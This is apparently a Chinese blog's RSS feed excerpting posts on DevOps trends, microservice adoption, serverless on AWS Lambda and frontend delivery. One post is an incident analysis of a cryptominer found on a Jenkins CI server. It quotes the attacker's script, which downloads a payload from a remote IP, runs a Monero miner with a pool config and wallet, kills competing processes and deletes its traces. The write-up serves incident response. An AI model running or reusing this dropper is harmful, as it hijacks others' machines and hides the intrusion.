我们采用 BDD/ATDD 的方式进行前端开发。用 NightWatch.JS 框架做 端到端的测试，mocha 和 chai 用于做某些逻辑的验证。 我们采用单代码库主干（develop 分支）进行开发，用 master 分支作为生产环境的部署。生产环境的发布则是通过 Pull Request 合并的。在合并前，我们会合并提交。 前端采用 Webpack 进行构建，形成前端的交付产物。在构建之前，先进行一次全局测试。 由于 S3 不光可以作为对象存储服务，也可以作为一个高可用、高性能而且成本低廉的静态 Web 服务器。所以我们的前端静态内容存储在 S3 上。每一次部署都会在 S3 上以 build 号形成一个新的目录，然后把 Webpack 构建出来的文件存储进去。 我们采用 Cloudfront 作为 CDN，这样可以和 S3 相互集成。只需要把 S3 作为 CDN 的源，在发布时修改对应发布的目录就可以了。 由于我们做到了前后端分离。因此前端的数据和业务请求会通过 Ajax 的方式请求后端的 Rest API，而这个 Rest API 是由 Amazon API Gateway 通过 Swagger 配置生成的。前端只需要知道 这个 API Gateway，而无需知道API Gateway 的对应实现。</description></item><item><title>从最新一期技术雷达看 DevOps 的发展</title><link>https://wwww.guyu.me/posts/2017-12-07-devops-trends-in-tech-radar/</link><pubDate>Thu, 07 Dec 2017 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2017-12-07-devops-trends-in-tech-radar/</guid><description>今年4月份，我第一次以主编的身份参加技术雷达的翻译工作。有幸第一时间参加到技术雷达的翻译过程中。通过我在翻译其间对条目的了解和观察，我写下了《DevOps发展的九个趋势》
今年11月份，我再一次以执行主编的身份参加第17期技术雷达的翻译工作。17 期技术雷达中两大主题：Kubernetes 和 Cloud as the New Normal 都是 DevOps 相关的。而且本期技术雷达涌现了众多 DevOps 相关的新条目。一方面说明了 DevOps 在 IT 业的重要性日渐增加，一方面也支撑起了 DevOps 社区在工具和实践上的创新。虽然每个人对 DevOps 的理解不尽相同，但能持续的着眼在具体的问题并提供实际的解决方案则是值得称道的。
这些新的变化对我上一期的 DevOps 技术趋势判断和发展有了新的思考和认识，借由此文分享给大家。
回顾2017年 DevOps 发展 # 在今年 4月第16期技术雷达发布后，我分析了 DevOps 发展的九个趋势。我认为这九个趋势代表了2017年 DevOps 技术的发展方向。让我们来结合最新的技术雷达回顾一下2017年这些趋势的发展。
趋势1：微服务目前仍然是DevOps技术应用和发展的主要领域 # 现状：微服务的相关技术仍然不断涌现。但人们似乎过于乐观的估计了微服务的投资回报速度。架构演进是一个长期的过程，而实践中的陷阱和问题越来越多。不断涌现的诸多工具和解决方案说明了微服务的反思已经开始。让我们期待更多微服务的案例出现。
趋势2：以Docker为核心的数据中心方案逐渐走向成熟 # 现状：Kubernetes 生态圈在 Docker 编排工具的争霸大战中笑道了最后，本期技术雷达把 Kubernetes 移动到了“采用”中，证明 Kubernetes 是经得住时间考验的工具。随着越来越多的厂商和社区开始围绕 Kubernetes 构建自己的产品，我相信基于 Kubernetes 的产品和工具会越来越多。
趋势3：不完整的DevOps实践阻碍着DevOps的发展 # 现状：虽然 DevOps 社区的活跃程度催生了一大批的工具和平台，但却在推广实践上发力不足。接受了局部技术改进后的 DevOps 演进似乎立刻停止，使得 DevOps 难以发挥出更大的价值。随着时间的发展，这种局面会愈来愈常见。如方法论的推广落后于工具的发展，那么 DevOps 运动的寿终正寝也将为期不远。
趋势4：领域特定的DevOps实践开始出现 # 现状：虽然并没有十分特别的领域特定的 DevOps 技术出现。但受到 DevOps 启发的 DesignOps 和 DevSecOps 也分别有了自己的社区群体。期待它们在未来有进一步的表现。
趋势5：采用DevOps进行技术债务重组和技术资产管理 # 结果：我写下这个趋势的第二周就进入了这样一个技术资产管理项目并工作到现在。在这 6 个月中我和同事们采用了 DevOps 理念和技术进行技术资产重组和互联网企业 IT 资产并购，并体会到了其中的诸多益处，大大节约了产品上线时间和上线风险，而且产品的开支的随着时间以更快的速度递减。随着 CloudNative 的技术和概念的成熟，相信这类的项目和案例会越来越丰富。
趋势6：安全成为推动DevOps全面发展的重要力量 # 结果：OWASP Top10 和 OWASP Top10 Mobile 的姗姗来迟虽然并未进入本期技术雷达。但并不表明技术雷达对安全有所松懈，这反而是一种更加负责的态度。而安全相关的实践已从使用工具进入安全场景的设计。例如最新期的 3Rs 安全 和 上一期就提到的 KeyCloak，以及本期提到的用于安全的 Sidecar 模式。</description></item><item><title>关于 DevOps ，咱们聊的可能不是一回事</title><link>https://wwww.guyu.me/posts/2017-12-03-we-are-talking-different-devops/</link><pubDate>Sun, 03 Dec 2017 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2017-12-03-we-are-talking-different-devops/</guid><description>在过去的三年中，我作为 DevOps 的咨询师参与了很多企业的 DevOps 转型咨询以及技术实施，也在不同的社区活动中分享了自己在 DevOps 上的实践、理解和观点。
随着 DevOps 的盛行，我在很多场合和越来越多的人聊起 DevOps。也在不同的渠道听到了很多人在讲 DevOps。然而，讨论的背后，我发现每个人对 DevOps 所指并不是同一件事情，也由于各执一词导致不欢而散。
于是我通过 DevOpsDays 的官方网站整理所有 DevOps 的有关材料，随着学习和了解的不断增多，我也渐渐的对 DevOps 有了更进一步的认识。我把学到的材料经过整理后把陆续放在了简书上，形成了&amp;quot; DevOps 前世今生&amp;quot; 这个系列，这个系列还在不断补充新的材料。
含义越来越丰富的 DevOps # DevOps 至今都缺乏一个清晰和统一的认识。对于一场运动来说，这是一件好事，也同样是一件坏事。虽然 Patrick 曾经在自己的博客里一再提到自己对 DevOps 的&amp;quot;正确认识''，但社区似乎不以为然。
缺乏“官方定义”好处是人人都可以定义，因此没有一个人或者组织可以垄断 DevOps 定义权。所以每个人都自己可以参与到这一运动中去，不断为其增加新的概念、新的实践和新的工具。这会使 DevOps 社区不断的繁荣。
而坏处也很明显，对于 DevOps 的后来者 —— 那些没有参与进来的人，需要学习和理解的 DevOps 知识的广度和深度也越来越大。
以至于后来出现了这幅众所周知的“盲人摸象图”：
这幅图中包含了很多概念，但主要表现的意义 DevOps 是一系列概念的总和，任何一个单方面的定义只是 DevOps 的一个部分，而不是 DevOps 的整体，随着 DevOps 这个概念的不断膨胀，人们就更难理解 DevOps 了。
那么，你理解的 DevOps 是指的什么 # 在接触了各类客户和社区之后，我开始尝试理解每个人谈到 DevOps 的时候，他们分别指的是什么，以及所指内容背后的目标和动机。渐渐的，我把我所听到的 DevOps 概念分成如下四类，分别是：
DevOps 是一组技术/实践 DevOps 是一个角色 DevOps 是一种工作方式 DevOps 是一种组织结构 那么，我们分别来谈谈这四类 DevOps。
当 DevOps 是一组技术/实践 # 在工程师文化的组织里，对先进技术的渴望是最常见的学习动机。可以促进工程师用更有效率，更优雅的方式解决问题。而对于非工程师文化的组织，新的技术往往是提升其 KPI 的工具。以下是我听到 DevOps 的时候，经常触及的话题：
高频部署 持续交付 云计算/虚拟化技术 基础设施即代码 Docker 自动化运维 高频部署 # 曾经和某跨国著名银行的外汇交易产品的 IT 产品负责人交流 DevOps。对方很自豪的告诉我，他们产品每天的部署频率超过500次，我听了不以为然。因为，部署频率高不见得是件好事。于是我问了以下几个问题：</description></item><item><title>Serverless 风格的微服务的架构案例</title><link>https://wwww.guyu.me/posts/2017-09-21-serverless-architecture-sample/</link><pubDate>Thu, 21 Sep 2017 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2017-09-21-serverless-architecture-sample/</guid><description>Serverless 架构最早可以追溯到 Ken Fromm 发表的文章《Why The Future Of Software And Apps Is Serverless》。在这篇文章里， Ken Fromm 描述了在未来云计算基础设施普及的情况下。在构建应用程序的时候，开发人员和运维人员无需担心服务器如何安装配置，如何设置网络和负载均衡，无需监控状态，甚至不再会出现服务器相关的工作内容。这样可以让原本建设机房的时间成本和货币成本从按年计算缩短至按秒计算。
在 Martin Fowler 的博客《Serverless Architectures》中，他将无服务器架构分为两种：
第一种无服务器架构被称为被称为 BaaS（Backend as a Service，后端应用即服务）。即应用的架构是由一大堆第三方 API 来组织的。一切状态和逻辑都由这些服务提供方来管理。随着移动应用和单页 Web 应用这样的富客户端（Rich Client）应用的普及，前后端的通信渐渐以 API 调用为主，而所需的服务不再由 服务端应用开发工程师和运维工程师来维护，只需要调用提供服务的第三方 API 就可以完成相应的功能。例如云上的数据库服务和用户认证服务。
另一种无服务器架构被称为 FaaS（Function as a Service，函数即服务)。这一架构的兴起源于 AWS Lambda 的发展。 AWS Lambda 是一种无状态的代码运行时服务，这项服务提供最小的代码运行资源。你可以使用 Java，Node.js，Python 和 C# 编写程序处理 AWS 各种服务的事件。无需初始化一台服务器，安装操作系统并配置程序运行环境。由于运行资源很少，完成的计算有限，使得这种应用无法保存状态，因此这类程序以函数的方式存在。
本文所介绍的 Serverless 架构主要是以 AWS Lambda 以及 Amazon API Gateway 架构的应用，它同时也具备 BaaS 的特征。
AWS Lambda 的编程模型 # AWS Lambda 的编程模型如下所示：
AWS Lambda 运行在一个虚拟的容器里，但你无法配置这个容器。此外，这个虚拟的容器有一些[资源限制]，主要限制如下：
5 分钟（300 秒）的程序运行时间。 512 MB 的文件系统空间。（在 /tmp 目录下） 最大1536 MB 的内存。（最小 128 MB，以 64 MB 作为增量） 最多 1024 个文件描述符。 最大 1024 个内部线程。 Lambda 的执行流程：</description></item><item><title>微服务实施常被忽视的 5 个难点</title><link>https://wwww.guyu.me/posts/2017-08-16-five-blocks-to-microservices/</link><pubDate>Wed, 16 Aug 2017 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2017-08-16-five-blocks-to-microservices/</guid><description>笔者从 2013 年加入 ThoughtWorks 至今共 4年时间。在这 4 年的时间里，我分别以 开发人员， DevOps 工程师、DevOps 咨询师、微服务架构师以及微服务咨询师的角色参与了共计 7 个产品和项目的微服务咨询和实施。其中有有成功，有失败，有反思，更多的是学习和总结。以下是我这些年来在微服务咨询上的经验总结，希望能给陷入微服务实施困境的人带来一些帮助。
难点1：“一步到位”的认知错觉 # 这些年微服务大红大紫，但是真正能够拿出来做为可实践的案例少之又少。大部分的微服务案例只能看到微服务架构的“演进结果”。但是看不到微服务架构的“演进过程”。
这就给很多架构师一个假象：微服务的架构是通过能力极高的架构师一步到位设计出来的。这和很多产品团队自上而下的架构设计风格感受和相似。于是架构师们蜂拥而至，分析和讨论此起彼伏。各种分析方法论层出不穷，讨论和分享络绎不绝。然而真正落地实施的却很少，使得微服务在网络上慢慢变成了一种“玄学”，还停留在“讲道理”的阶段。
这违反了架构的最基本原则：架构是解决当前的需求和痛点演进的。而不是预先设计出来的。因此，整体的微服务架构设计完全没有必要。如果需要一个集中化的设计，那么如何体现微服务的去中心化轻量级优势?
可以说这是某些技术咨询公司的一种把戏，通过提升新技术的应用门槛把新技术变成一种稀缺资源。
从经济学上讲，我相信技术的发展一定是向不断降低成本的方向上发展的。如果新技术没有降低成本反而提升了成本，要么这个新技术有问题，要么一定是姿势不对，走错了路。
这就引出了了第二个难点：
难点2：“架构师精英主义” # 很多产品对架构师的依赖很大，即“架构师精英主义”：认为产品架构只有这个组织的“技术精英”——架构师才可以完成，而团队其它成员只需要实现架构师的设计和产品经理的决策就可以。
而微服务架构则是一种“边际革命”：即由一个不超过8个人的小团队就可以完成的工作，两个人甚至都可以完成微服务。而这种规模的团队即使从整个产品团队移除也对整体产品的研发进度没有影响。因此，即使失败了不会带来太多的损失。然而，如果第一个微服务改造成功，那么成功经验的复制带来的乘数效应却能带来很大的收益。
从架构改造投资的风险收益比来看，这是非常划算的。
因此，微服务团队完全没必要大张旗鼓，只需要两三个人就可以动工。
但是，谁也没有微服务的实践经验啊，万一失败了怎么办？
这就带来了第三个难点：
难点3：缺乏一个信任并鼓励创新的环境 # 面对未知的领域，失败再所难免。而面对这个不确定性频发的世界，成功和失败往往不再重要：也许今天的失败，明天再看，就是成功，反之亦然。
无论成败，我们都能从行动的过程中有所学习和反思，而这样的经验才是最有价值的。成功仅仅意味着结果符合自己的假设，而失败则意味着结果不符合自己的假设。
然而，很多组织，尤其“精英主义”的产品团队，责任和压力往往在上层，由于组织庞大，金字塔的结构往往会构建一种以“不信任对方”为基础的制度。这种制度往往营造了一种“宁可不作为，也不能犯错”的文化。由于上层则需要对失败负责，使得任何创新停留在组织的上层的想法，难以落实推进。由于组织的长期合作形成了稳定的工作习惯和思维定势，使得整个组织在面对创新的时候“卡壳”。
而解决组织“卡壳”的办法就是引入“晃动器”，需要有外部的力量（例如新招聘的高管或外部咨询师）来打破当前的工作习惯和思维定势。组织才可以继续运转下去。
难点4：微服务技术栈的“选择困难症“ # 由于“精英主义”的架构师需要担负很大的责任，因此架构师往往承担着很重的压力。他们必须要为微服务架构谨慎的选择技术栈。因此会在不同的技术栈之间尝试。
对于习惯了在大型组织里面“长设计，慢反馈”的人们而言。更加认为这样的节奏是理所应当的。
另一方面，微服务开源社区的快速发展滋长了“架构师焦虑”：如果采用落后的技术会被同行鄙视，被不懂技术的老板鄙视，甚至被下属鄙视。因此架构师们疲于在各种新型的技术栈之间比较和学习。此外，不熟悉技术往往会增大风险，架构师就需要更多的时间研究。带着“一步到位”的架构幻想对微服务技术栈精挑细选。而不会采用现有低成本的方案快速迭代的解决问题。
以上四点会让大型组织面对微服务实施的时候“卡壳”，而这往往会导致微服务实施容易忽略的最重要一点，我认为也是核心的一点：
难点5：对微服务的技术变革估计过高，而对微服务带来的组织变革估计严重不足 # 作为架构师，永远要不要低估康威定理的威力： “设计系统的组织，其产生的设计和架构等价于组织间的沟通结构。”
如果你的组织结构是去中心化的小团队结构，那么不用担心，你的应用架构会朝组织架构的方向演进。
反之，如果你不是一个去中心化的小团队结构，那么微服务的架构会和组织架构格格不入。最好的结果是组织结构随着系统架构的改变而改变，否则产品架构会给组织带来很多沟通问题。
从制度经济学角度上讲，软件产品本身就是企业内部组织（员工）和外部组织（用户）沟通的代码化制度。这个制度的发展一定是在不断缩小内部组织之间以及内外部组织沟通成本的。
那么，如何高效的推动微服务架构演进呢？
如果以上 5 点都让你膝盖中箭。那么根据我个人的经验，综合解决微服务实施难点的第一条建议就是：
步骤1：以终为始，先构建一个独立的敏捷微服务团队 # 我们对微服务的期待就是：可以独立开发，独立部署，独立发布，并且去中心化管理。那么，我们就先构造一只“可以独立开发，独立部署，并且去中心化管理”的团队。
这个团队为了达到这个目标，会采取各种方法（例如：DevOps，全功能团队）解决阻碍”独立开发，独立部署，独立发布 和 去中心化的问题。而根据康威定理，系统的架构会慢慢向去中心化方向发展。
一定要意识到，这个过程会打破大型系统自上而下的所有流程并采用更有生产力的方式构建新的组织结构。充分信任团队，不要用老眼光控制团队的运作，这会打击团队的士气。
管理建议：
让微服务团队完全脱离之前的工作，如果分心同时做几件事，每件事都不会做到最好。 给微服务团队一些特权，为了满足“全功能微服务团队的”诉求，特事特办。 如果团队在执行的过程出现了依赖从而阻碍了进度。则需要把依赖标明出来。代码中的依赖容易看见，但组织中的流程依赖很难发现。 为了避免团队对外部的“依赖惯性”，让团队自己想办法在内部解决依赖。 技术建议：
为微服务建立一个全新的代码库，而不要从原先的代码库上克隆或者复制，避免和原团队的开发依赖。 建设一个独立的持续交付流水线，最好是通过“流水线即代码技术”（例如 Jenkinsfile）来自动生成流水线。 步骤2：构建微服务的“电梯演讲” # 成立了微服务团队之后，接下来就是要选择第一个实现的微服务。但是这个微服务应该多大，边界在哪是个问题。我的建议是通过“电梯演讲”的方式来定义微服务。格式是：
（XX微服务）用来 在（出现痛点的场景）的情况下 分离了（预期的效果）
解决了（当前单块架构的痛点）的问题
从而（带来的价值）
例如:
（订单查询微服务）用来 在（订单查询请求数量激增的）的情况下
分离了（订单查询请求）
解决了（因为大量查询导致订单创建性能下降）的问题
从而（提升了订单系统整体的性能）
管理建议：
把微服务的电梯演讲打印出来挂到墙上，让团队成员铭记于心。这会强化组织对微服务的边界认识。 随着团队的反思和学习，电梯演讲有可能会变更，但一定要让团队形成共识好和一致的意见。 不要期望一次就能划分正确。划分是一个持续权衡取舍的过程。 随着团队的划分， 技术建议:
明确了微服务的职责和边界之后再去看代码，否则会被代码的复杂度影响。</description></item><item><title>提升微服务实施效率的 7 个步骤</title><link>https://wwww.guyu.me/posts/2017-08-16-seven-steps-to-start-your-microservices-project/</link><pubDate>Wed, 16 Aug 2017 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2017-08-16-seven-steps-to-start-your-microservices-project/</guid><description>本文是GitChat《为什么微服务实施那么难？如何高效推进微服务架构演进》的下半部分。标题和部分内容已做修改。
微服务实施常被忽视的 5 个难点中描述了实施微服务常见的主要阻碍。本文针对前文提到的 5 个难点提出了 7 个步骤。每个步骤分别包含了管理和技术两方面的建议。
如果之前的 5 点都让你膝盖中箭。那么根据我个人的经验，综合解决微服务实施难点的第一步就是：
步骤1：以终为始，先构建一个独立的敏捷微服务团队 # 我们对微服务的期待就是：可以独立开发，独立部署，独立发布，并且去中心化管理。那么，我们就先构造一只“可以独立开发，独立部署，并且去中心化管理”的团队。
这个团队为了达到这个目标，会采取各种方法（例如：DevOps，全功能团队）解决阻碍”独立开发，独立部署，独立发布 和 去中心化的问题。而根据康威定理，系统的架构会慢慢向去中心化方向发展。
一定要意识到，这个过程会打破大型系统自上而下的既有流程并采用更有生产力的方式构建新的组织结构。你索要做的就是要充分信任团队，把它看做是一个微型的技术管理创新。不要用老的方式控制团队的运作，这会打击团队的士气。
管理建议：
让微服务团队完全脱离之前的工作，专心于微服务的工作中。如果分心同时做几件事，每件事都不会做到最好。 给微服务团队一些特权，为了满足“全功能微服务团队的”诉求，特事特办。 如果团队在执行的过程出现了依赖从而阻碍了进度。则需要把依赖标明出来。代码中的依赖容易看见，但组织中的流程依赖很难发现。 为了避免团队对外部的“依赖惯性”，让团队自己想办法在内部解决依赖。 组织流程的改变也是很重要的微服务架构产物，而不仅仅是微服务代码或基础设施。 技术建议：
为微服务建立一个全新的代码库，而不要从原先的代码库上克隆或者复制，避免和原团队的开发依赖。 建设一个独立的持续交付流水线，最好是通过“流水线即代码技术”（例如 Jenkinsfile）来自动生成流水线。 步骤2：构建微服务的“电梯演讲” # 成立了微服务团队之后，接下来就是要选择第一个实现的微服务。但是这个微服务应该多大，边界在哪是个问题。这不需要进行严格的设计和反复的论证，只要发现当前的痛点或者想要完成一个假设就足够上路了。让整个过程变轻，而不是变重。
我的建议是通过“微服务电梯演讲”的方式来定义微服务。格式可以是：
(XX微服务）用来 在（出现痛点的场景）的情况下 解决了（解决现有的某个问题） 从而（达到什么样的效果） 提升了（微服务的价值）
例如：
（订单查询微服务）用来 在（订单查询数量快速）的情况下 解决了（访问数量迅速升高导致整体应用性能下降的问题） 从而（分离了订单查询请求） 提升了（提升了其他功能的性能）
当构造了微服务的电梯演讲，团队就可以以此为原则启动了。当碰到和现有系统冲突的问题，替换几个词比较有帮助你做决策。（语言一定程度上也是具有魔力的）
把“拆分”换成“移除”。例如：“从现有系统中拆分出订单查询功能” 转变为 ”从现有系统中移除订单查询功能“。思维方式就从一个团队负责两个系统变成了两个团队负责两个系统。
把“集成”换成“调用”。例如：”用户注册和用户登录需要集成”转变为“用户登录服务需要调用用户注册服务的信息”。思维方式就把两个系统的关系更精确了，从而明确了微服务之间的关系和沟通方式。
管理建议：
把微服务的电梯演讲打印出来挂到墙上，让团队成员铭记于心。这会强化组织对微服务的边界认识。 随着团队的反思和学习，电梯演讲有可能会变更，但一定要让团队形成共识好和一致的意见。 不要期望一次就能划分正确。划分是一个持续权衡取舍的过程。 技术建议：
明确了微服务的职责和边界之后再去看代码，否则会被代码的复杂度影响。 领域驱动设计（DDD）可以帮助你更好的划分微服务。领域驱动设计很好的遵循了“关注点分离”（Separation of concerns，SOC）的原则，提出了更成熟、清晰的分层架构。 不会领域驱动设计（DDD）也没有关系。简单的使用“关注点分离原则”也可以帮你达到这一点。例如：从接口中分离出流量较大的接口独立部署，把读数据库和写数据库的 API 分开独立部署，把静态和动态访问分离……等等。 步骤3：以最小的代价发布出第一个微服务 # 要注意两个关键点：一个是“最小的代价”，另一个是“发布”（Release）。
正如前文所述，微服务架构本身就觉了微服务一定是低成本低风险的渐进式演进。而最大的浪费在于：
级别/职责分工明确的组织沟通结构。
“长时间，慢反馈”的行动习惯。
先进且学习成本较高的技术栈。
因此，“最小的代价”包含了以下三个方面：
最精简的独立敏捷全功能团队。
最快的时间。
代价最小的技术栈。
此外，很多微服务的“爱好者”由于害怕失败，因此将微服务技术始终放在“实验室”里。要勇于面对失败，在生产环境中面对真实的问题，但要采取一些规避风险的措施。</description></item><item><title>你的 CI 在挖矿吗？</title><link>https://wwww.guyu.me/posts/2017-06-28-are-your-ci-mining/</link><pubDate>Wed, 28 Jun 2017 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2017-06-28-are-your-ci-mining/</guid><description>我们的持续集成服务器搭建在AWS上的一个EC2的虚拟机中。采用 Jenkins 2.46.1 并且只有一个Master实例来运行所有的任务。且采用持续部署——团队每天要在开发环境自动部署10+个版本。整个过程由Jenkins内部构建的流水线触发。代码提交，测试，构建，部署一气呵成。
我们有一个中心产品代码库，这个中心产品对应着不同国家的在线产品。分别是：新加坡，马来西亚，印度尼西亚和香港。为了安全起见，我们为每一个产品的环境单独部署了一套持续交付流水线。由于各地域产品的差异较小，我们采用同一套基础设施配置初始化Jenkins配置，因此，我们有四台差不多的持续交付流水线。
从一次“构建变慢“的调查说起 # 在周二的时候，突然有人发现”马来西亚“的部署流程开始变慢，其中构建过程从上周的的7分钟左右变成了44分钟。而同样的代码改动，其它国家的服务器并没有如此大的差异。
那么问题一定在这个服务器上！
影响构建速度的因素主要是资源的占用导致的等待，这方面的资源包括：CPU、内存、磁盘和网络。
由于我们采用NewRelic对所有的持续集成服务器进行监控。所以可以得到CPU、内存、磁盘和网络的性能监控数据以及横向的对比信息。通过对比相关的数据，我们发现这一台服务器上有个在/tmp目录下运行的叫`donns`的陌生进程长期占用大量CPU，它的文件权限属于Jenkins用户以及Jenkins用户组。所以这个程序的执行是由Jenkins出发了。
我们在Jenkins的相关网站里搜索这个名为donns进程的相关信息，但一无所获。于是我们在/tmp目录中寻找和这个进程相关的信息，我们发现了一个陌生的Shell脚本，打开内容看，内容却让我们大跌眼镜。以下是几个重要的脚本片段：
代码片段 1:
pkill conns ps auxw|head -1;ps auxw|sort -rn -k3|head -1|awk &amp;#39;{if(\$3\&amp;gt;80.0) print &amp;#34;kill -9 &amp;#34; \$2}&amp;#39;|sh pkill bonns 我们看到，这段代码杀死了占用CPU超过80%的进程。此外，杀死了名为conns和bonns的进程。
conns进程是什么？bonns进程又是什么？为什么要杀死CPU占用率超过80%的进程？
代码片段 2:
wget 91.235.143.129:8086/587b626883fdc.png -O /tmp/conn wget 91.235.143.129:8086/1eac80002f.conf -O /tmp/config.conf 从91.235.143.129:8086下载了一个图片和一个配置文件。这个服务器是干嘛的？这个配置文件又包含了哪些内容？
通过在自己的沙盒环境里打开这个配置文件，发现它的内容是这样的：
{ &amp;#34;url&amp;#34; : &amp;#34;stratum+tcp://xmr.crypto-pool.fr:3333&amp;#34;, &amp;#34;user&amp;#34; : &amp;#34;43ZQzwdYHC9ebXxZhJuwkH5jvmfEBCEjkd1PvqxacrJaEDQFyNuxJhcib8MsJRgFnbATB6rpBEzq8EKqRqUbjyNy3opCS4k&amp;#34;, &amp;#34;pass&amp;#34; : &amp;#34;x&amp;#34; } stratum+tcp 协议引发了我的好奇心，经过调查，这居然是一个叫做门罗币的加密虚拟币的矿池协议：
门罗币****XMR一种使用CryptoNote协议的一个虚拟币币种，其并不是比特币的一个分支。CryptoNote在2012年已经开发出来，当年已有Bytecoin使用CrytoNote技术，XMR是在2014年开发出来，可以预见CryptoNote技术已经非常成熟，该技术通过数字环签名提供更好的匿名性。目前国内对该币种匿名技术宣传较少，国外知名度较高。Monero词语是引自于世界语，在世界语中的含义表示为货币。
而矿池则是是比特币(Bitcoin)等P2P密码学虚拟货币开采所必须的基础设施，一般是对外开放的团队开采服务器，其存在意义为提升比特币开采稳定性，使矿工薪酬趋于稳定。
假设100万人参与比特币挖矿，全网400P算力，其中90%的矿工为1P(1000T)以下的算力，如果投入一台1T矿机，将占全网算力的40万分之1，理论上平均每40万个10分钟能挖到一个区块，也就是7.6年才能挖到一个区块然后一次性拿到50个比特币。那么，假如我再找9个拥有1T算力矿机的矿工，达成协定，我们总共10个人，其中任何一个人挖到区块，都按照每人的算力占比来进行平分，那么我们就是一个整体，总共10T算力，那么平均0.76年即可挖到一个区块，然后算下来到我们手上的就是0.76年开采到5个比特币，如果组织100人、1000人、1万人甚至10万人呢？如果是10万人，那么平均100分钟就能挖到1个区块，作为团队的一份子，我的收入将会趋于稳定。这就是矿池的基本原理，即大家组队进行比特币开采，可以参考彩票中的合买。
当然，以上只是对矿池的基本原理和性质进行简单的描述，实际情况会非常复杂。矿池是一个全自动的开采平台，即矿机接入矿池——提供算力——获得收益。
抱着“大胆假设，小心求证”的心态，我们找到了配置文件中这家叫做crypyto-pool的网站https://monero.crypto-pool.fr/它是一个著名门罗币的矿池网站。而通过配置文件的用户名，我们看到了这个程序的挖矿记录和转账记录。根据6月份的交易数据以及对应牌价，截止作者发稿时，该程序已 为作者赚取了 1165.64 美元的收益。
而接下来的代码间接暴露了证据：
代码片段 3:
dd if=/tmp/conn skip=7664 bs=1 of=/tmp/donns chmod +x /tmp/donns nohup /tmp/donns -B -c /tmp/config.conf \&amp;gt;/dev/null 2\&amp;gt;&amp;amp;1 &amp;amp; rm -rf /tmp/config.conf rm -rf /tmp/conn rm -rf /tmp/conns rm -f /tmp/bonn.sh 这段脚本不光执行了程序，并且删除了执行后的相关文件记录。确认了是挖矿进程之后，我们果断的停止了进程，并且把对应的环境制作成了临时镜像以便做进一步分析。</description></item><item><title>DevOps前世今生 - DevOps 的文化</title><link>https://wwww.guyu.me/posts/2017-05-21-devops-culture/</link><pubDate>Sun, 21 May 2017 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2017-05-21-devops-culture/</guid><description>用工具堆砌的DevOps 幻觉 # 在第一届 DevOpsDays结束后，DevOps 运动则如星火燎原之势在全球发展开来。随着 DevOps 思想的不断传播，相对的质疑和批评也从未停止过。以至于到今天对于 DevOps 的定义还是众说纷纭，争论不休。
当人们还在争论 DevOps的时候，一批基于敏捷的工程实践和自动化工具带着 DevOps 的标签走入了人们的视野。人们开始认为 DevOps 就是使用这些工具进行自动化。
在早期的 DevOps 实践里，开发和运维仍然是分离的。而在很多企业中，运维部门往往是核心部门，评审应用软件的架构设计和上线要求。于是运维部门开始利用这些被称作为“DevOps”的自动化工具管理设备和应用系统。并且将自己相关的实践打赏了“DevOps”的标签传播开来。
于此同时，开发团队开始采用这些工具构建开发用的测试环境。并将运维需求带入了开发流程中，这促进了內建质量。并且利用持续集成服务器（Continous Integration Serever） 构建持续交付流水线（Continuous delivery pipeline）来可视化软件交付的进度和流程，并通过流水线完成了自动化部署。持续集成服务器连接了开发和运维！
这就是DevOps ？
“同床异梦” 的 DevOps # 虽然开发团队和运维团队使用的工具变了，然而事情却没有改变：我们仍然能看到”流程结合在一起，但工作目标仍然分离“的两个团队：运维团队仍然牢牢控制着环境，控制着上线标准和上线流程。通过补充更多自动化的测试和验证手段构建更加严格的控制着变更的入口和出口。开发团队仍然不停的为了满足运维团队制定的更加严格的开发规范更加努力的学习各种工具而不断加班。
运维团队仍然不关心开发团队是否需要帮助，开发团队也依然不了解运维团队在做什么。如果没有 DevOps文化的建立，DevOps 仅仅是“通过自动化工具和手段构建的标准流程”而已。
有人甚至开始把这两个团队融合在了一起，变成了一个团队。这在一定程度上缓解了这种矛盾，但是相互指责却并没有让团队凝聚起来更加具有战斗力。而是变成了一个缓慢而争论不休的“Dev和Ops 法庭”：项目经理或者产品经理成为了法官，Dev 和 Ops 则轮番成为原告和被告。
这不是 DevOps !
早期的 DevOps文化：信任和尊重 # 早在 “10+ Deploys Per Day: Dev and Ops Cooperation at Flickr” 的演讲里，就总结出了 Dev 和 Ops 的合作并不能仅仅只有工具，还需要依托文化把某些行为和价值观带到组织内部。这个演讲很有洞见的总结了 Dev 和 Ops 的不同观点和思维模式，并从 Dev 和 Ops 的立场分别给出了促进合作的建议。这其中包括：
尊重：避免成见并尊重他人的经验，观点和责任。不要只是一味的拒绝改变，或者把隐藏细节。对于Dev 来说，当和 Ops 交流的时候，则应该告诉代码对 Ops 工作的影响。
信任：对于 Ops 来说，他们应该相信 Dev 新增加的功能。对于 Dev 来说，他们 应该相信 Ops对基础设施的改动，而且每个人都应该相信对方已经做到最好。 Ops 应该更加透明，不光需要分享运行指南和故障预案，而且还要给 Dev 能够访问机器的权限。
对失败的健康态度：尽管经过层层严格的测试，失败在很多情况下是无法避免的。但如果能像飞机的安全说明那样制定出应急预案，则可以在失败后尽可能的减少损失。
避免指责：指责会把大量的时间花在问题责任的界定而非问题的解决上。对于 Dev 来说，他们需要时刻记得当他们写下的 代码搞砸了之后，总会有 Ops 半夜第一个被叫醒去解决问题。而对于 Ops 来说，需要给当前的状况有建设性的建议和反馈，而不仅仅是抱怨和指责 。
缺失的 DevOps文化建设 —— 用技术升级粉饰制度问题 # 在很多管理层看来，这些不可思议的做法颠覆了经典的运维管理经验，看起来很美好而往往和现有的制度存在冲突而难以落地。另一方面，工程师却很向往这样一种梦想的工作环境，可以摆脱那些无意义争斗和约束，做真正有意义的事情。</description></item><item><title>DevOps发展的九个趋势</title><link>https://wwww.guyu.me/posts/2017-05-02-devops-in-tech-radar/</link><pubDate>Tue, 02 May 2017 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2017-05-02-devops-in-tech-radar/</guid><description>DevOps 包含了太多方面的技术和实践，很难通过一个统一的工具链来描述其发展。即便如此，我们仍然可以从 ThoughtWorks 技术雷达的条目变动中看出一些趋势。今年，我有幸作为主编参与了最新一期技术雷达的翻译，作为 DevOps 